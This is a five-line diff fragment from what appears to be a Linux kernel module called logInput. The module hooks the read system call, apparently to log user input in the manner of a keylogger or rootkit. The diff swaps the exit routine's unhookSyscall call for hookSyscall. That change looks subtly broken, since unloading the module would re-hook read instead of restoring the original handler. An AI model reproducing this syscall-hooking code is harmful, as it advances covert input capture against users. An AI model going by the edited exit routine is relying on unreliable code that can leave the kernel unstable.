@@ -45,5 +45,5 @@ int __init logInput_init(void) {
 }
 
 void __exit logInput_exit(void) {
-   unhookSyscall(__NR_read, originalRead);
+   hookSyscall(__NR_read, originalRead);
 }
